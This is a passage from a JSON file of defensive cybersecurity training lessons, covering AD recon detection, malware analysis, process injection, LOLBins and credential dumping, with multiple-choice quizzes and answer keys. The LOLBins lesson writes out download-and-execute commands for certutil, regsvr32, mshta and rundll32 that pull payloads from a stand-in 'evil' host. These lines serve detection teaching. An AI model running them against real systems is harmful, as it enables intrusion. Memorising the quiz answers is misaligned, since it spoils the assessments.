LDAP volume per account so bulk enumeration stands out."
    }
  ],
  "keyTakeaways": [
    "AD recon precedes every attack because compromise is relationship-driven: attackers enumerate users (T1087), groups (T1069), trusts (T1482), SPNs, and especially ACLs over LDAP, and BloodHound/SharpHound turn that data into an attack-path graph whose transitive edges (GenericAll, ForceChangePassword, AdminTo) reveal routes to Domain Admins.",
    "Detect enumeration by volume and breadth, not single queries: watch for bursts of Event ID 4662 security-descriptor reads, LDAP recon flagged by Defender for Identity, and honeytoken accounts being touched; defend with least-privilege ACL hygiene, tiering, and running BloodHound defensively to cut paths first."
  ],
  "quiz": [
    {
      "question": "A SOC notices one standard user account generating thousands of Event ID 4662 object-read operations across users, groups, and computer objects within a few minutes. What is the most likely explanation?",
      "options": [
        {
          "label": "A scheduled backup service reading its own configuration objects during a nightly maintenance job on the domain controller.",
          "value": "a"
        },
        {
          "label": "SharpHound performing bulk AD enumeration, collecting object ACLs and memberships to build a BloodHound attack-path graph.",
          "value": "b"
        },
        {
          "label": "A single interactive user logon that reads only that user's own group memberships as part of applying group policy.",
          "value": "c"
        },
        {
          "label": "Normal replication between two domain controllers synchronizing directory changes across the site link on schedule.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct: a burst of thousands of 4662 reads spanning many object types and touching security descriptors is the hallmark of SharpHound ACL/membership collection for BloodHound. (a) A backup service reads a narrow, predictable set of objects, not the whole directory. (c) A normal logon reads only the user's own memberships, nowhere near thousands of objects. (d) Replication is DC-to-DC and would not originate from a standard user account."
    },
    {
      "question": "Why do defenders consider Active Directory ACLs, not just group memberships, a critical part of the BloodHound attack surface?",
      "options": [
        {
          "label": "ACLs are encrypted with the krbtgt key, so reading them requires domain admin rights that most attackers cannot obtain.",
          "value": "a"
        },
        {
          "label": "ACLs can grant rights like GenericAll or ForceChangePassword that create non-obvious escalation edges chainable into a path.",
          "value": "b"
        },
        {
          "label": "ACLs are stored only on domain controllers and never replicate, so they remain completely invisible to LDAP enumeration tools.",
          "value": "c"
        },
        {
          "label": "ACLs primarily control file share permissions and therefore have no bearing on Kerberos or directory privilege escalation.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Correct: delegated rights such as GenericAll, WriteDACL, and ForceChangePassword form graph edges that let an attacker escalate without any exploit, and BloodHound's transitive pathfinding chains them toward Domain Admins. (a) ACLs are readable by any authenticated user and are not krbtgt-encrypted. (c) Object security descriptors replicate and are readable over LDAP, which is how SharpHound collects them. (d) These are directory-object ACLs governing AD rights, not merely file share permissions."
    }
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1087/",
    "https://attack.mitre.org/techniques/T1069/002/",
    "https://learn.microsoft.com/en-us/defender-for-identity/reconnaissance-discovery-alerts"
  ],
  "xp": 240,
  "estimatedMinutes": 40,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-static-vs-dynamic-malware-analysis",
  "slug": "static-vs-dynamic-malware-analysis",
  "title": "Static vs Dynamic Malware Analysis and Sandboxing",
  "topic": "Malware Analysis",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "When a suspicious file lands in your queue, you have two fundamental ways to examine it: look at it without running it (static) or run it in a controlled environment and watch what it does (dynamic). This lesson gives a SOC analyst a practical triage workflow using both approaches, plus a realistic view of what sandboxes can and cannot tell you.",
  "sections": [
    {
      "heading": "Static Analysis: Examining Without Executing",
      "content": "**Static analysis** inspects a file's contents without running it, so it is inherently **safe** — the code never executes on your machine. It is the fast first pass in triage and answers the question \"what is this file, and does it look suspicious?\"\n\nKey static signals an analyst extracts:\n\n- **Strings**: printable text embedded in the binary. URLs, IP addresses, registry keys, file paths, PowerShell fragments, and error messages often leak the malware's intent. Tools: `strings`, FLOSS (which also decodes obfuscated strings).\n- **PE headers**: for Windows executables, the Portable Executable header reveals compile timestamp, target architecture, sections, and the declared entry point. A compile time in the future or a mismatched checksum is a red flag.\n- **Imports (IAT) and imphash**: the Import Address Table lists which Windows API functions the binary calls. Imports like `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread` strongly suggest process injection. The **imphash** is a hash of the import table used to cluster related samples across campaigns.\n- **Entropy and packing**: high **entropy** (approaching 8.0) in a section indicates compression or encryption, a classic sign of **packing**. Packers like UPX hide the real code until runtime. Tools like DIE (Detect It Easy) or PEiD flag known packers.\n\nStatic triage also includes hashing the file (SHA-256) and checking reputation via **VirusTotal** or your threat-intel platform. A known-bad hash ends triage immediately.\n\n**Limitation**: packing, encryption, and obfuscation blunt static analysis. A heavily packed sample may show almost no meaningful strings or imports until it unpacks itself in memory — which only happens when it runs. That is exactly where dynamic analysis takes over."
    },
    {
      "heading": "Dynamic Analysis and Sandboxes: Detonation",
      "content": "**Dynamic analysis** runs the sample in an isolated environment and observes its **behaviour** — what it actually does, regardless of how the code is obfuscated. This is often called **detonation**.\n\nA **sandbox** is an instrumented, disposable virtual machine (or emulator) that executes the file while recording:\n\n- **Process activity**: child processes spawned, injection into other processes, command lines used.\n- **File system changes**: files dropped, modified, or deleted.\n- **Registry changes**: persistence keys such as `Run`/`RunOnce`, service creation.\n- **Network activity**: DNS lookups, C2 beaconing, downloads of second-stage payloads.\n- **API calls**: the sequence of Windows APIs invoked, revealing injection, credential theft, or encryption behaviour.\n\nCommon sandboxes include **Cuckoo/CAPE**, **Any.Run** (interactive, cloud), **Joe Sandbox**, and **Hybrid Analysis**. The output is a behavioural report plus extracted **IOCs** (indicators of compromise) — hashes, domains, IPs, mutexes — that you can pivot on and push into detections.\n\nThe great advantage: dynamic analysis defeats packing. When the sample unpacks itself to run, the sandbox captures the unpacked code and its true behaviour. You do not need to manually unpack anything.\n\nDynamic analysis is riskier and slower than static — you are running live malware — so it must stay isolated from production networks. Detonation typically takes minutes and may need internet access (or a simulated internet like INetSim) for the malware to reveal its full behaviour, since many samples do nothing without reaching their C2."
    },
    {
      "heading": "Sandbox Limits: Evasion and Sandbox-Aware Malware",
      "content": "Sandboxes are powerful but not infallible. Modern malware is frequently **sandbox-aware** and will refuse to detonate if it suspects analysis, producing a clean-looking report from a malicious file. An analyst must know these evasion tricks so a \"nothing happened\" result is not misread as safe.\n\nCommon evasion techniques:\n\n- **Sleep / time-based evasion**: the malware calls long `Sleep()` or delays execution for minutes or hours, outlasting the sandbox's analysis window before doing anything malicious. Some perform \"stalling loops.\"\n- **Environment checks**: it looks for artifacts of virtualization — VMware/VirtualBox drivers, specific MAC address prefixes, small disk sizes, few CPU cores, low RAM, or the presence of analysis tools like Wireshark and Process Monitor.\n- **User-interaction checks**: it waits for mouse movement, scrolling, or a certain number of documents in Recent to confirm a real human is present.\n- **Domain / geolocation checks**: it only fires on machines joined to a target domain or in a specific country.\n\nMapped to MITRE ATT&CK, these fall under **Virtualization/Sandbox Evasion (T1497)** and **Time Based Evasion (T1497.003)**.\n\nMitigations in a mature sandbox: patching known VM artifacts, simulating user activity, fast-forwarding sleep calls, and running the sample multiple times with different configurations. Interactive sandboxes (like Any.Run) let the analyst click through decoy prompts that automated detonation would miss.\n\n**Practical rule**: a clean sandbox verdict is not proof of innocence. Combine it with static red flags, threat-intel reputation, and context (how the file arrived, who sent it). Absence of evidence is not evidence of absence when the malware may simply be hiding."
    },
    {
      "heading": "A Practical SOC Triage Workflow",
      "content": "An analyst is not a reverse engineer and does not need IDA Pro or a debugger for most triage. The goal is a fast, defensible verdict and good IOCs. A workable order of operations:\n\n| Step | Action | Question answered |\n|------|--------|-------------------|\n| 1 | Hash the file, check VirusTotal / TI | Is it already known-bad? |\n| 2 | Static: strings, PE header, imports, entropy | What does it look like? Packed? |\n| 3 | Detonate in sandbox | What does it actually do? |\n| 4 | Extract IOCs from behaviour | What do I hunt and block? |\n| 5 | Pivot and scope | Did it touch other hosts? |\n\n**Safety first**: never double-click a suspicious file on your own workstation. Handle samples only in an isolated analysis VM or an air-gapped detonation environment. Store samples password-protected (often the zip password \"infected\") to prevent accidental execution and AV interference during transfer.\n\n**When to escalate**: if the sample is novel (no reputation), clearly targeted, or shows advanced evasion, escalate to a dedicated malware-analysis or threat-intel team rather than forcing a verdict.\n\n**Turning analysis into defence**: the real payoff of triage is detection content. Extracted IOCs feed SIEM watchlists and firewall/proxy blocklists; behavioural patterns (a Word document spawning PowerShell that reaches out to a new domain) become detection rules. Static clustering via imphash lets you find related samples from the same actor.\n\nRemember the complementary nature of the two methods: static is fast, safe, and defeated by packing; dynamic is slower, riskier, and defeated by evasion. Used together they cover each other's blind spots, which is why real triage always uses both."
    }
  ],
  "keyTakeaways": [
    "Static analysis is fast and safe but blinded by packing and obfuscation, while dynamic sandbox detonation reveals true behaviour but can be defeated by sandbox-aware evasion (MITRE T1497) — use both because each covers the other's blind spot.",
    "A clean sandbox verdict never proves a file is safe: time-based sleeps and VM/environment checks make malware stay dormant, so always combine behavioural results with static red flags, reputation, and delivery context before deciding."
  ],
  "quiz": [
    {
      "question": "A packed executable arrives in your queue. Static analysis shows almost no readable strings and only a handful of imports, all related to memory allocation. What is the most effective next triage step?",
      "options": [
        {
          "label": "Conclude the file is benign because it has too few imports to do anything malicious on the host.",
          "value": "a"
        },
        {
          "label": "Detonate the sample in an isolated sandbox so it unpacks itself and reveals its real behaviour.",
          "value": "b"
        },
        {
          "label": "Delete the file immediately and close the alert since packed files are always false positives.",
          "value": "c"
        },
        {
          "label": "Run the sample directly on your own workstation to save time and watch the network traffic.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Packing hides strings and imports until runtime, so dynamic detonation in an isolated sandbox captures the unpacked code and behaviour (b). Option (a) is wrong because few imports plus high entropy signals packing, not innocence. Option (c) discards evidence and IOCs on a false premise. Option (d) is a dangerous safety violation — never run suspected malware on a production or personal host."
    },
    {
      "question": "A sandbox report for a suspicious sample comes back completely clean — no file, registry, or network activity. Threat intel and the delivery context still look suspicious. How should you interpret this?",
      "options": [
        {
          "label": "The clean report proves the file is safe, so you can confidently close the alert without further work.",
          "value": "a"
        },
        {
          "label": "The sandbox is broken and its results should always be ignored in favour of static analysis alone.",
          "value": "b"
        },
        {
          "label": "The malware may be sandbox-aware and evading analysis, so treat the clean result with suspicion.",
          "value": "c"
        },
        {
          "label": "Network activity is optional for malware, so the missing traffic is normal and not worth noting.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "Sandbox-aware malware uses sleeps and environment checks (MITRE T1497) to stay dormant and produce a clean report, so a clean verdict against suspicious context warrants suspicion, not closure (c). Option (a) treats absence of evidence as evidence of absence. Option (b) overreacts — sandboxes are useful, just not infallible. Option (d) ignores that the total absence of any activity from a flagged file is itself a red flag for evasion."
    }
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1497/",
    "https://github.com/mandiant/flare-floss",
    "https://any.run/malware-trends/"
  ],
  "xp": 220,
  "estimatedMinutes": 38,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-process-injection",
  "slug": "process-injection",
  "title": "Process Injection: Hiding Code Inside Trusted Processes",
  "topic": "Defense Evasion",
  "difficulty": "advanced",
  "kind": "lesson",
  "intro": "Process injection (MITRE ATT&CK T1055) is one of the most common defence-evasion techniques: instead of running malware as its own suspicious process, an attacker runs malicious code inside a legitimate, trusted, often signed process. This lesson covers the main injection sub-techniques, why attackers use them, and the specific Sysmon and EDR telemetry a SOC analyst uses to catch them.",
  "sections": [
    {
      "heading": "What Process Injection Is and Why Attackers Use It",
      "content": "**Process injection** is the act of executing arbitrary code within the address space of a separate, live process. It is catalogued in MITRE ATT&CK as **T1055** and sits under both Defense Evasion and Privilege Escalation.\n\nThe attacker's goal is to **hide in plain sight**. Consider the difference between these two scenarios:\n\n- Malware runs as `evil.exe` — an unsigned binary in a temp folder making network connections. Trivial to spot.\n- The same malicious code runs inside `explorer.exe`, `svchost.exe`, or `notepad.exe` — a signed, expected, whitelisted Windows process. Now the malicious network beacon appears to come from a trusted process.\n\nInjection buys the attacker several advantages:\n\n- **Evasion of process-based detection**: allowlists, reputation checks, and \"unknown binary\" alerts are bypassed because the host process is legitimate and signed.\n- **Masquerading of network traffic**: a proxy or firewall sees `svchost.exe` reaching out, which looks normal.\n- **Access to the victim process's context**: memory, tokens, and handles of the target — useful for stealing data or escalating.\n- **Persistence and stealth**: no malicious file needs to remain on disk if the code lives in memory (fileless).\n\nInjection almost always requires the ability to open a handle to another process and write to its memory, which is why the Windows APIs involved (`OpenProcess`, `VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`, `QueueUserAPC`, `SetThreadContext`) are such strong static and behavioural indicators. Recognising the family of techniques matters because detection differs subtly between them."
    },
    {
      "heading": "Classic DLL Injection and APC Injection",
      "content": "**Classic remote-thread DLL injection** is the textbook method and maps to **T1055.001 (Dynamic-link Library Injection)**. The sequence is:\n\n1. `OpenProcess` — get a handle to the target process with sufficient access rights.\n2. `VirtualAllocEx` — allocate memory inside the target.\n3. `WriteProcessMemory` — write the path of a malicious DLL (or shellcode) into that memory.\n4. `CreateRemoteThread` — start a new thread in the target that calls `LoadLibrary` on the injected DLL path, loading the attacker's code.\n\nThe `CreateRemoteThread` call is the loud, observable moment — one process starting a thread in another is abnormal for most software.\n\n**APC injection (T1055.004)** avoids creating an obvious remote thread. Windows lets you queue an **Asynchronous Procedure Call** to an existing thread with `QueueUserAPC`. When that thread enters an alertable wait state, the queued function — the attacker's shellcode — runs. A common variant, **\"Early Bird\"** injection, queues the APC to a process created in a suspended state so the payload runs before security products fully hook the process.\n\n**Reflective DLL loading (T1620, closely related)** takes stealth further: instead of writing a DLL path and calling `LoadLibrary` (which registers the module and leaves it visible in the loaded-module list), the loader maps the DLL into memory manually and resolves its imports itself. Because the OS loader was never involved, the module does not appear in normal module enumerations — making it much harder to spot with tools that list loaded images. This is why memory-based EDR inspection, not just image-load logging, is needed."
    },
    {
      "heading": "Process Hollowing and Other Variants",
      "content": "**Process hollowing (T1055.012)** is a distinctive and widely abused technique for masquerading. The steps:\n\n1. Create a legitimate process (e.g., `svchost.exe`) in a **suspended** state.\n2. **Unmap (hollow out)** the legitimate code from the process's memory using `NtUnmapViewOfSection` / `ZwUnmapViewOfSection`.\n3. Allocate new memory and **write the malicious image** into the hollowed process.\n4. Adjust the entry point with `SetThreadContext` to point at the malicious code.\n5. **Resume** the thread — the process now looks like `svchost.exe` on disk and in the process list, but runs attacker code.\n\nThe telltale signs of hollowing are a mismatch between what is on disk and what is in memory: the image file backing the process differs from the executing memory, sections marked as expected are replaced, and the process is often a child of an unexpected parent.\n\nRelated variants an analyst should recognise by name:\n\n| Technique | ATT&CK ID | Distinguishing trait |\n|-----------|-----------|----------------------|\n| DLL injection | T1055.001 | CreateRemoteThread + LoadLibrary |\n| PE / hollowing | T1055.012 | Suspended process, unmapped image |\n| APC injection | T1055.004 | QueueUserAPC, Early Bird |\n| Thread hijacking | T1055.003 | SuspendThread + SetThreadContext |\n| Process Doppelganging | T1055.013 | TxF transactions, no file on disk |\n\nA common thread across all of them: attacker-controlled memory regions marked **RWX (read-write-execute)**. Legitimate code is normally RX (executable but not writable); a large private, unbacked RWX region holding shellcode is one of the strongest injection indicators available to memory scanners and EDR."
    },
    {
      "heading": "Detection with Sysmon and EDR, and Defence",
      "content": "Sysmon provides several event IDs that map directly onto injection behaviour. The analyst's job is to correlate them rather than alert on any single one.\n\n- **Event ID 8 — CreateRemoteThread**: the most direct signal for classic injection. A process creating a thread in an unrelated process — especially into `lsass.exe`, `explorer.exe`, or a browser — is highly suspicious. Filter out known-benign pairs to reduce noise.\n- **Event ID 10 — ProcessAccess**: logs one process opening a handle to another, including the **GrantedAccess** mask. Access rights like `PROCESS_VM_WRITE` (0x0020), `PROCESS_VM_OPERATION` (0x0008), and `PROCESS_CREATE_THREAD` (0x0002) together indicate injection intent. Access to `lsass.exe` with these rights overlaps with credential dumping too.\n- **Event ID 7 — Image/Module Load**: a DLL loaded from an unusual path (temp, user profile) or an unsigned module loaded into a signed process warrants review. Note that reflective loading evades this because no image load occurs.\n- **Event ID 1 — Process Create**: reveals anomalous parent-child relationships (e.g., `winword.exe` spawning `svchost.exe`) and suspended-process creation patterns tied to hollowing.\n\n**EDR** adds what Sysmon cannot: memory scanning for RWX regions and unbacked executable memory, API call telemetry (`VirtualAllocEx` -> `WriteProcessMemory` -> `CreateRemoteThread` sequences), and detection of a process image in memory differing from its on-disk file (hollowing).\n\n**Defensive measures**:\n\n- Enable and tune Sysmon EID 8 and 10 with a maintained config (e.g., SwiftOnSecurity/Olaf Hartong baselines).\n- Deploy a memory-aware EDR and enable behavioural/attack-surface-reduction rules.\n- Protect high-value processes: **LSASS as a Protected Process Light (PPL)** and **Credential Guard** block many handle-opens against it.\n- Apply least privilege so malware runs without the rights to open and write to other processes.\n- Hunt for cross-process handle opens with write/create-thread access to sensitive processes as a proactive detection."
    }
  ],
  "keyTakeaways": [
    "Process injection (T1055) hides malicious code inside legitimate, signed processes to defeat process-based detection and masquerade network traffic; the sub-techniques (DLL injection, hollowing, APC, reflective loading) differ in mechanics but share attacker-controlled RWX memory and cross-process handle abuse.",
    "Detection relies on correlating Sysmon Event ID 8 (CreateRemoteThread), ID 10 (ProcessAccess with VM_WRITE/CREATE_THREAD GrantedAccess), ID 7 (anomalous image loads), and ID 1 (odd parent-child), plus EDR memory scanning — while defence centres on LSASS PPL/Credential Guard, least privilege, and tuned telemetry."
  ],
  "quiz": [
    {
      "question": "An analyst sees Sysmon Event ID 8 showing winword.exe creating a remote thread inside explorer.exe, shortly after a phishing document was opened. Why is this pattern a strong injection indicator?",
      "options": [
        {
          "label": "Word legitimately manages the desktop shell, so creating threads in explorer.exe is expected routine behaviour.",
          "value": "a"
        },
        {
          "label": "One process starting a thread in an unrelated trusted process is abnormal and signals code injection to evade detection.",
          "value": "b"
        },
        {
          "label": "Event ID 8 only fires when a file is deleted, so this simply means a temporary document was removed.",
          "value": "c"
        },
        {
          "label": "Explorer.exe is unsigned malware by default, so any thread activity inside it is always benign noise.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "CreateRemoteThread (EID 8) from an unrelated process into a trusted one like explorer.exe is classic DLL/remote-thread injection used for evasion (b). Option (a) is false — Word has no reason to inject threads into the shell. Option (c) misdescribes Event ID 8, which logs remote thread creation, not file deletion. Option (d) is wrong on facts: explorer.exe is a signed legitimate Windows binary, and thread injection into it is exactly the abuse."
    },
    {
      "question": "A memory scan from EDR flags a large private RWX region inside svchost.exe that does not match any DLL on disk, and the process was started suspended. Which technique does this best describe?",
      "options": [
        {
          "label": "Standard software updating, since legitimate services routinely allocate large executable memory during patches.",
          "value": "a"
        },
        {
          "label": "Process hollowing, where a suspended process is emptied and replaced with a malicious image in memory.",
          "value": "b"
        },
        {
          "label": "A normal DLL load recorded by Sysmon Event ID 7 that always appears in the module list.",
          "value": "c"
        },
        {
          "label": "Kernel driver signing, which requires services to keep writable executable pages during boot.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "A suspended-start process with an in-memory image that differs from disk, plus an unbacked RWX region, is the signature of process hollowing (T1055.012) (b). Option (a) is wrong because legitimate software does not run from unbacked RWX memory that mismatches disk. Option (c) is incorrect — hollowing and reflective techniques specifically avoid normal module-list image loads. Option (d) is fabricated; driver signing does not require writable executable pages in user-mode services."
    }
  ],
  "references": [
    "https://attack.mitre.org/techniques/T1055/",
    "https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon",
    "https://attack.mitre.org/techniques/T1055/012/"
  ],
  "xp": 220,
  "estimatedMinutes": 38,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-lolbins-living-off-the-land",
  "slug": "lolbins-living-off-the-land",
  "title": "LOLBins: Living Off the Land Binaries",
  "topic": "Defense Evasion",
  "difficulty": "intermediate",
  "kind": "lesson",
  "intro": "Attackers increasingly avoid bringing their own tools and instead abuse the legitimate, signed binaries already shipped with Windows — a strategy called living off the land (MITRE ATT&CK T1218). This lesson explains why signed, built-in tools defeat traditional blocklists, walks through the most-abused LOLBins, and shows how a SOC analyst detects and defends against their misuse.",
  "sections": [
    {
      "heading": "What LOLBins Are and Why They Work",
      "content": "**LOLBins** (Living Off the Land Binaries) are legitimate executables — signed by Microsoft and pre-installed on Windows — that attackers repurpose for malicious actions such as downloading payloads, executing code, or bypassing application control. The broader tradecraft of using built-in tools is called **living off the land (LotL)**, and MITRE ATT&CK tracks it primarily under **T1218 (System Binary Proxy Execution)** and related techniques.\n\nWhy is this so effective?\n\n- **Signed and trusted**: these binaries carry valid Microsoft signatures. Security controls that trust signed Microsoft code, or that block \"unknown\" executables, wave them through.\n- **Already present**: nothing new is dropped to disk, so file-reputation and \"first seen\" detections have nothing to flag. This supports fileless attacks.\n- **Blocklists fail**: traditional allow/block lists work on file identity (hash, name, publisher). You cannot simply block `rundll32.exe` — Windows itself and countless legitimate applications depend on it. The binary is simultaneously essential and dangerous.\n- **Blends with normal activity**: administrators use many of these same tools daily, so malicious use hides in a sea of legitimate use.\n\nThe key mental shift for an analyst: with LOLBins you cannot detect on the **presence** of the binary, only on **how it is used** — the command-line arguments, the parent process that launched it, and the network or file behaviour that follows. Detection moves from \"what ran\" to \"what it was told to do and why.\"\n\nThe community-maintained **LOLBAS Project** (Living Off The Land Binaries, Scripts and Libraries) catalogues these binaries, the exact functions they can be abused for (Execute, Download, AWL bypass), and example command lines — an essential reference for both detection engineering and threat hunting."
    },
    {
      "heading": "The Most-Abused Windows LOLBins",
      "content": "An analyst should recognise these binaries and their abuse patterns on sight:\n\n| Binary | Legitimate purpose | Abuse |\n|--------|--------------------|-------|\n| **rundll32.exe** | Run functions exported by DLLs | Execute malicious DLLs/JS; proxy execution |\n| **regsvr32.exe** | Register/unregister COM DLLs | \"Squiblydoo\" — run remote scriptlet, AWL bypass |\n| **mshta.exe** | Run HTML Applications (.hta) | Execute remote HTA/JScript/VBScript |\n| **certutil.exe** | Certificate management | Download files from URLs; decode base64 payloads |\n| **bitsadmin.exe** | Manage BITS transfers | Download payloads; create persistence jobs |\n| **wmic.exe** | WMI command line | Remote execution, recon, XSL script execution |\n| **msbuild.exe** | Build .NET projects | Compile and run inline C# from a crafted project file |\n| **installutil.exe** | Install .NET assemblies | Execute code via installer/uninstaller methods, AWL bypass |\n\nSome canonical abuse command lines:\n\n- `certutil.exe -urlcache -split -f http://evil/payload.exe payload.exe` — certutil acting as a file downloader.\n- `regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll` — the \"Squiblydoo\" technique running a remote scriptlet and bypassing application whitelisting (T1218.010).\n- `mshta http://evil/a.hta` — mshta fetching and executing a remote HTML application (T1218.005).\n- `rundll32.exe javascript:\"..\\mshtml,RunHTMLApplication \";...` — rundll32 executing inline JavaScript.\n\nMany of these are **proxy execution** (T1218) sub-techniques: the malicious code is technically run by the trusted binary, so the process tree shows a signed Microsoft executable as the actor. `certutil` (T1105 Ingress Tool Transfer) and `bitsadmin` (T1197 BITS Jobs) are especially common for pulling second-stage payloads into an environment."
    },
    {
      "heading": "Detecting LOLBin Abuse",
      "content": "Because you cannot block these binaries, detection focuses on **anomalous usage**. Rich command-line logging is the single most important prerequisite — enable **Sysmon Event ID 1** and Windows **4688** with command-line auditing, or rely on EDR process telemetry.\n\nHigh-value detection signals:\n\n- **Unusual command-line arguments**: `certutil` with `-urlcache` or `-decode`; `regsvr32` with `/i:http`; `mshta` or `rundll32` referencing a URL or `javascript:`/`vbscript:` protocol; `msbuild` running a project file from a temp or user directory. These argument patterns rarely appear in legitimate use.\n- **Unexpected parent-child relationships**: Office applications (`winword.exe`, `excel.exe`, `outlook.exe`) spawning `mshta`, `rundll32`, `wscript`, `powershell`, or `certutil` is a textbook phishing-to-execution chain. A LOLBin whose parent is a document handler is far more suspicious than the same binary launched by a system process.\n- **LOLBins making network connections**: correlate process creation with **Sysmon Event ID 3 (Network Connection)**. `certutil.exe`, `bitsadmin.exe`, `mshta.exe`, or `regsvr32.exe` connecting to an external IP is abnormal — these tools rarely reach the internet in normal desktop use. `msbuild.exe` or `installutil.exe` making outbound connections is almost never legitimate.\n- **Execution from unusual locations** or with obfuscated/encoded arguments.\n\nA robust approach is to build detections directly from the **LOLBAS** command-line examples and hunt for those patterns, then tune out the legitimate administrative baseline in your environment. Correlation beats single events: `outlook.exe -> mshta.exe -> certutil.exe download -> new external connection` is a chain that tells a clear story even though each binary is individually trusted."
    },
    {
      "heading": "Defending Against Living Off the Land",
      "content": "Since removal is not an option, defence combines application control, telemetry, and least privilege.\n\n**Application control (the strongest lever)**:\n\n- **Windows Defender Application Control (WDAC)** and **AppLocker** can restrict *how* these binaries run, not just whether they exist. Microsoft publishes a **recommended block-rules list** specifically to neutralise commonly abused LOLBins (including many listed here) in WDAC policies. Enforcing these blocks the known bypass paths while preserving legitimate system operation.\n- **Attack Surface Reduction (ASR) rules** in Microsoft Defender directly target several LOTL patterns — for example, blocking Office applications from creating child processes and blocking executable content from email and script interpreters.\n\n**Telemetry and monitoring**:\n\n- Ensure command-line logging is enabled everywhere (Sysmon EID 1 / 4688) — without arguments, LOLBin detection is nearly impossible.\n- Deploy detections modelled on LOLBAS examples and alert on the parent-child and network anomalies above.\n- Monitor for script-interpreter and proxy-execution binaries reaching the internet.\n\n**Least privilege and hardening**:\n\n- Remove local administrator rights where possible; many LOLBin techniques are far more damaging with elevated privileges.\n- Disable or constrain features attackers lean on (e.g., legacy script hosts, macros from the internet).\n\n**Threat hunting**: proactively sweep for the classic command lines (`certutil -urlcache`, Squiblydoo, `mshta http`) across your fleet. Because legitimate admins occasionally use these tools, expect to triage with context — who ran it, on which host, launched by what parent, and what happened next. The goal is not to eliminate the binaries but to make their malicious use noisy and visible."
    }
  ],
  "keyTakeaways": [
    "LOLBins are signed, built-in Windows binaries (rundll32, regsvr32, mshta, certutil, bitsadmin, wmic, msbuild, installutil) abused for proxy execution and downloads (T1218); because they are trusted and essential you cannot blocklist them, so detection must focus on how they are used, not their presence.",
    "Detect LOLBin abuse through command-line auditing (Sysmon EID 1 / 4688), anomalous parent-child chains (Office spawning these tools), and LOLBins making network connections (EID 3); defend with WDAC/AppLocker using Microsoft's recommended block rules, ASR rules, and least privilege."
  ],
  "quiz": [
    {
      "question": "During triage you see outlook.exe spawn mshta.exe, which then launches certutil.exe running with a -urlcache argument pointed at an external URL. Why is blocking certutil.exe by name a poor primary defence here?",
      "options": [
        {
          "label": "Certutil is malware that Microsoft accidentally ships, so blocking it by name fully resolves the threat.",
          "value": "a"
        },
        {
          "label": "Certutil is a legitimate signed system tool relied on by Windows, so detection must target its abusive usage instead.",
          "value": "b"
        },
        {
          "label": "Certutil cannot make network connections at all, so the observed download must be a false positive.",
          "value": "c"
        },
        {
          "label": "Blocking by name is impossible in Windows because binaries have no filenames the system can read.",
          "value": "d"
        }
      ],
      "answer": "b",
      "explanation": "Certutil is a legitimate, signed, system-relied-upon binary, so you cannot simply block it; you detect on abusive usage like -urlcache downloads and suspicious parent chains (b). Option (a) is false — certutil is a genuine certificate tool, not malware. Option (c) is wrong: certutil can and here does make outbound connections, which is exactly the abuse. Option (d) is technically incorrect; application control can absolutely target filenames, but doing so here would break legitimate functionality."
    },
    {
      "question": "Your organization wants to reduce LOLBin abuse without breaking legitimate Windows operations. Which approach best fits that goal?",
      "options": [
        {
          "label": "Uninstall rundll32, regsvr32, and certutil from every endpoint to remove the binaries entirely.",
          "value": "a"
        },
        {
          "label": "Disable all command-line logging to cut noise, then rely only on file-hash blocklists for detection.",
          "value": "b"
        },
        {
          "label": "Deploy WDAC/AppLocker with Microsoft's recommended block rules plus ASR rules and command-line logging.",
          "value": "c"
        },
        {
          "label": "Trust every Microsoft-signed binary automatically and stop monitoring their process activity for anomalies.",
          "value": "d"
        }
      ],
      "answer": "c",
      "explanation": "WDAC/AppLocker with Microsoft's recommended block rules restricts how abused binaries run, ASR blocks common LOTL chains, and command-line logging enables detection — all without removing essential tools (c). Option (a) would break Windows, since these binaries are core dependencies. Option (b) is counterproductive: command-line logging is the key enabler for LOLBin detection, and file hashes do not help against trusted binaries. Option (d) is precisely the flawed trust assumption LOLBins exploit."
    }
  ],
  "references": [
    "https://lolbas-project.github.io/",
    "https://attack.mitre.org/techniques/T1218/",
    "https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-block-rules"
  ],
  "xp": 220,
  "estimatedMinutes": 38,
  "researchUsed": false,
  "createdAt": "2026-08-14T00:00:00.000Z"
},
{
  "id": "topic-lesson-credential-dumping-lsass-sam-ntds",
  "slug": "credential-dumping-lsass-sam-ntds",
  "title": "Credential Dumping: LSASS, SAM, and NTDS.dit",
  "topic": "Credential Access",
  "difficulty": "advanced",
  "kind": "lesson",
  "intro": "After gaining a foothold, attackers hunt for credentials to move laterally and escalate — a technique family MITRE ATT&CK calls OS Credential Dumping (T1003). This lesson covers where Windows stores credentials, how each store (LSASS memory, the SAM, and the domain NTDS.dit) is dumped in practice, and the specific Sysmon and event telemetry a SOC analyst uses to detect it.",
  "sections": [
    {
      "heading": "Where Windows Credentials Live",
